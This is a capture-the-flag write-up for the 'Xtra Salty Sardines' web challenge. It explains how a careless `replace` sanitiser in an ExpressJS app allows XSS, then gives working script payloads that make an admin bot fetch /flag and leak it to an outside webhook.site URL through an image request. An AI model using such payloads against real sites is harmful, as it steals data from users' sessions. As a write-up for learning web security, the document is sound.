## Xtra Salty Sardines
> Clam was intensely brainstorming new challenge ideas, when his stomach growled! He opened his favorite tin of salty sardines, took a bite out of them, and then got a revolutionary new challenge idea. What if he wrote a site with an extremely suggestive acronym?

Challenge contain a web and admin bot to submit url.
After review [Source code](script.js?raw=true) of web (ExpressJS) , i notice some point:
1. App use `replace` method, kind of unsafe function vulnerable to XSS.
2. Only admin bot can get the flag
Idea: Submit url that vulnerable to xss to admin bot, then admin bot visit that url top trigger exploit.
Trigger alert: `<<test>><script>alert(1)</script>`
Get flag: `<<test"'&>><script>var xhr = new XMLHttpRequest();
xhr.open("GET", '/flag', false);
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        flag = xhr.responseText;
        var img=document.createElement("img");
        img.src="https://webhook.site/ca269945-4061-4664-a7a3-edc8d0d6c1a9/?c="+flag;
        document.body.appendChild(img);
    }
};
xhr.send(null);
</script>`
Or using `fetch` API
`<<test"'&>><script>
fetch('https://xtra-salty-sardines.web.actf.co/flag').then(response=>{return response.text()})
.then(data=>{img=document.createElement("img");
img.src="https://webhook.site/ca269945-4061-4664-a7a3-edc8d0d6c1a9/?c="+data;
document.body.appendChild(img);})</script>`

![Alt text](flag.png?raw=true "Title")  